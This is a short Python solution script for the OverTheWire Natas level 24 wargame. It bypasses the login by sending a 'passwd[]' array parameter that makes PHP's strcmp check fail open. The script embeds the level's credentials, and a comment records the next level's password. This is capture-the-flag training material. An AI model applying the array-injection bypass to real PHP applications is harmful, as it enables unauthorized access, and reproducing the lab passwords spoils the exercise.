import requests

url = 'http://natas24.natas.labs.overthewire.org/'
username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
session = requests.session()
response = session.get(url, params = {"passwd[]": "wrong_password"}, auth=(username, password))
print(response.text)


# this is helpful: https://www.php.net/manual/en/function.strcmp.php
# natas25_pass: GHF6X7YwACaYYssHVY05cFq83hRktl4c